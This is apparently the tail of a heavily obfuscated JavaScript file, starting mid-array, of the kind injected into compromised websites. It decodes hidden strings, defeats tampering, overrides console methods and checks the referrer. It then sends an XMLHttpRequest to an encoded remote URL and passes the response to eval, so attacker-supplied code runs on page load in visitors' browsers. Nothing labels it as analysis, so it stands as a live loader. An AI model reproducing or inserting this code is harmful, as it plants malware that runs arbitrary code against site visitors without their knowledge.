cNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};